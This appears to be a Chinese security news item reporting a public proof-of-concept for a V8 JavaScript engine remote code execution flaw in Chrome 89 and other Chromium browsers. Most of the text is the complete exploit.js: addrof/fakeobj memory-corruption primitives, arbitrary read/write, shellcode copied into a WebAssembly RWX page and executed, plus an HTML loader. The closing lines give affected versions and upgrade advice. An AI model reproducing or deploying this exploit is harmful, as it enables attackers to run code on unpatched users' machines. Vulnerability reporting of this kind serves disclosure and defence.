**HW期间，为防范钓鱼，即日起FreeBuf将取消投稿文章的一切外部链接。给您带来的不便，敬请谅解~**

一位印度安全研究人员已公开发布概念验证（PoC）漏洞利用代码，用于发现一个新漏洞， **该漏洞会影响Google
Chrome和其他基于Chromium的浏览器，例如Microsoft Edge，Opera和Brave。**

由Rajvardhan Agarwal发布的有效漏洞利用程序涉及V8
JavaScript渲染引擎中的一个远程代码执行漏洞，该漏洞为Web浏览器提供了动力。据信与上周在Pwn2Own 2021黑客大赛上Dataflow
Security的Bruno Keith和Niklas Baumstark所展示的缺陷相同。

与公司共享该漏洞的详细信息之后，Agarwal似乎能够通过对Google
Chromium团队推送到开源组件的补丁进行反向工程来组合PoC。鲍姆斯塔克在推特上说“在2021年，宾果游戏卡上并没有出现我们自己的错误。”
“不确定Google是否太聪明以至于不能立即添加该回归测试。”

 **Google已在最新版本的V8(测试版本)中解决了该问题** ，但尚未进入稳定的渠道，从而使浏览器容易受到攻击。
**预计Google将于今天晚些时候发布Chrome 90，但尚不清楚该版本是否将包含针对V8漏洞的补丁。**

![](https://image.3001.net/images/20210414/1618413197_6077068dd4edf9be8fdf2.png!small)

## 漏洞代码：

### exploit.js

    
    
    var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11])
    var wasm_mod = new WebAssembly.Module(wasm_code);
    var wasm_instance = new WebAssembly.Instance(wasm_mod);
    var f = wasm_instance.exports.main;
    
    var buf = new ArrayBuffer(8);
    var f64_buf = new Float64Array(buf);
    var u64_buf = new Uint32Array(buf);
    let buf2 = new ArrayBuffer(0x150);
    
    function ftoi(val) {
        f64_buf[0] = val;
        return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n);
    }
    
    function itof(val) {
        u64_buf[0] = Number(val & 0xffffffffn);
        u64_buf[1] = Number(val >> 32n);
        return f64_buf[0];
    }
    
    const _arr = new Uint32Array([2**31]);
    
    function foo(a) {
        var x = 1;
        x = (_arr[0] ^ 0) + 1;
    
        x = Math.abs(x);
        x -= 2147483647;
        x = Math.max(x, 0);
    
        x -= 1;
        if(x==-1) x = 0;
    
        var arr = new Array(x);
        arr.shift();
        var cor = [1.1, 1.2, 1.3];
    
        return [arr, cor];
    }
    
    for(var i=0;i<0x3000;++i)
        foo(true);
    
    var x = foo(false);
    var arr = x[0];
    var cor = x[1];
    
    const idx = 6;
    arr[idx+10] = 0x4242;
    
    function addrof(k) {
        arr[idx+1] = k;
        return ftoi(cor[0]) & 0xffffffffn;
    }
    
    function fakeobj(k) {
        cor[0] = itof(k);
        return arr[idx+1];
    }
    
    var float_array_map = ftoi(cor[3]);
    
    var arr2 = [itof(float_array_map), 1.2, 2.3, 3.4];
    var fake = fakeobj(addrof(arr2) + 0x20n);
    
    function arbread(addr) {
        if (addr % 2n == 0) {
            addr += 1n;
        }
        arr2[1] = itof((2n << 32n) + addr - 8n);
        return (fake[0]);
    }
    
    function arbwrite(addr, val) {
        if (addr % 2n == 0) {
            addr += 1n;
        }
        arr2[1] = itof((2n << 32n) + addr - 8n);
        fake[0] = itof(BigInt(val));
    }
    
    function copy_shellcode(addr, shellcode) {
        let dataview = new DataView(buf2);
        let buf_addr = addrof(buf2);
        let backing_store_addr = buf_addr + 0x14n;
        arbwrite(backing_store_addr, addr);
    
        for (let i = 0; i < shellcode.length; i++) {
            dataview.setUint32(4*i, shellcode[i], true);
        }
    }
    
    var rwx_page_addr = ftoi(arbread(addrof(wasm_instance) + 0x68n));
    console.log("[+] Address of rwx page: " + rwx_page_addr.toString(16));
    var shellcode = [3833809148,12642544,1363214336,1364348993,3526445142,1384859749,1384859744,1384859672,1921730592,3071232080,827148874,3224455369,2086747308,1092627458,1091422657,3991060737,1213284690,2334151307,21511234,2290125776,1207959552,1735704709,1355809096,1142442123,1226850443,1457770497,1103757128,1216885899,827184641,3224455369,3384885676,3238084877,4051034168,608961356,3510191368,1146673269,1227112587,1097256961,1145572491,1226588299,2336346113,21530628,1096303056,1515806296,1497454657,2202556993,1379999980,1096343807,2336774745,4283951378,1214119935,442,0,2374846464,257,2335291969,3590293359,2729832635,2797224278,4288527765,3296938197,2080783400,3774578698,1203438965,1785688595,2302761216,1674969050,778267745,6649957];
    copy_shellcode(rwx_page_addr, shellcode);
    f();

### exploit.html

    
    
    <script src="exploit.js"></script>

###

##  **影响范围:**

Chrome 89.0.4389.114 及以下版本

使用Chrome内核的其他浏览器，也会受到漏洞影响。

## 修复建议:

由于Chrome浏览器会默认开启沙盒，可以拦截利用该漏洞发起的攻击，所以一般用户不会受到影响。

用户也可以暂时将Chrome浏览器升级到已经修复的beta测试版（90.0.4430.70）

